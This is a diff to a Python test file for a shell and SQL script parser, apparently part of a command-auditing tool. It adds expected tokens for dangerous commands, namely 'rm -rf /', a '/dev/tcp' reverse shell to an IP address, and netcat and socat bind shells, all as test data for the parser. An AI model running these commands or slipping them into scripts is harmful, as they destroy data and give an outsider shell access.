@@ -51,7 +51,7 @@ def test_reader_bash():
         ((20, 20), ['kill', '-s', 'TERM', '123']),
         ((21, 21), ['reboot']),
         ((22, 22), ['sysctl', '-p']),
-        ]
+    ]
     s = reader.ShellReader(box_data.script_shell)
     counter = 0
     for x in s.iter():
@@ -68,8 +68,17 @@ def test_reader_bash_multiline():
         ((11, 11), ['-rf', ' ']),
         ((12, 12), ['/']),
         ((13, 15), ['rm', '\\\n-rf " \\\n/']),
-        ((16, 16), ['echo', 'Done']),
-        ]
+        ((16, 18), ['rm', '-r', '-f', '/']),
+        ((18, 18), ['ls', '-al']),
+        ((19, 22), ['rm', '--force', '-r', '/tmp/*']),
+        ((23, 23), ['kill', '-9', '123456']),
+        ((24, 24), ['kill', '-s', 'TERM', '123456']),
+        ((25, 25), ['kill', '-n', '9', '123456']),
+        ((26, 26), ['bash', '-i', '>', '/dev/tcp/10.201.61.194/5566']),
+        ((27, 27), ['nc', '-lvvp', '1988', '-e', '/bin/bash']),
+        ((28, 28), ['socat', '-lvvp', '1988', '-e', '/bin/bash']),
+        ((29, 30), ['echo', 'Done']),
+    ]
     s = reader.ShellReader(box_data.script_shell_multiline)
     counter = 0
     for x in s.iter():
@@ -93,11 +102,13 @@ def test_reader_sql():
         ((15, 15), [';']),
         ((16, 16), ['']),
         ((16, 16), [';']),
-        ((17, 28), ["CREATE TABLE `box` (`id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(36) NOT NULL, `description` varchar(63) DEFAULT '', `policy_id` int(11) unsigned NOT NULL, `subject_id` int(11) unsigned NOT NULL, PRIMARY KEY (`id`), KEY `fkey_box_policy_id` (`policy_id`), KEY `fkey_box_subject_id` (`subject_id`), CONSTRAINT `fkey_box_policy_id` FOREIGN KEY (`policy_id`) REFERENCES `policy` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION, CONSTRAINT `fkey_box_subject_id` FOREIGN KEY (`subject_id`) REFERENCES `subject` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION) ENGINE=InnoDB DEFAULT CHARSET=utf8;"]),
+        ((17, 28), [
+            "CREATE TABLE `box` (`id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(36) NOT NULL, `description` varchar(63) DEFAULT '', `policy_id` int(11) unsigned NOT NULL, `subject_id` int(11) unsigned NOT NULL, PRIMARY KEY (`id`), KEY `fkey_box_policy_id` (`policy_id`), KEY `fkey_box_subject_id` (`subject_id`), CONSTRAINT `fkey_box_policy_id` FOREIGN KEY (`policy_id`) REFERENCES `policy` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION, CONSTRAINT `fkey_box_subject_id` FOREIGN KEY (`subject_id`) REFERENCES `subject` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION) ENGINE=InnoDB DEFAULT CHARSET=utf8;"
+        ]),
         ((29, 29), ['']),
         ((29, 29), [';']),
         ((31, 31), ['']),
-        ]
+    ]
     s = reader.SqlReader(box_data.script_sql)
     counter = 0
     for x in s.iter():
@@ -115,7 +126,7 @@ def test_reader_line():
         ((6, 6), ['ls|grep abc && date||tree;ps -ef|grep grep']),
         ((7, 7), ['ps \\']),
         ((8, 8), ['-ef']),
-        ]
+    ]
     s = reader.LineReader(text_fulltext)
     counter = 0
     for x in s.iter():
@@ -124,9 +135,9 @@ def test_reader_line():
 
 
 def test_reader_fulltext():
-    expected = [
-        ((1, 9), ["top # haha\ncat > mytest.sh << EOF\n$a123 ';' $me\n\n# this is comment\nls|grep abc && date||tree;ps -ef|grep grep\nps \\\n-ef\n"])
-        ]
+    expected = [((1, 9), [
+        "top # haha\ncat > mytest.sh << EOF\n$a123 ';' $me\n\n# this is comment\nls|grep abc && date||tree;ps -ef|grep grep\nps \\\n-ef\n"
+    ])]
     s = reader.FullTextReader(text_fulltext)
     counter = 0
     for x in s.iter():
